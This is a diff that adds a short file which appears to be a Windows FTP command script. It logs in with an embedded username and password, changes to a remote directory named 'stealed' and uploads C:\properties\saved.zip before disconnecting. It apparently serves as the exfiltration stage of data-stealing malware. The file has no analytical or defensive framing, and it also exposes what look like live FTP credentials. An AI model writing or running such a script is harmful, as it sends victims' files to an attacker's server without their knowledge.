@@ -1,0 +1,7 @@
+u115717949
+7710024
+prompt
+cd stealed
+put C:\properties\saved.zip
+close
+bye
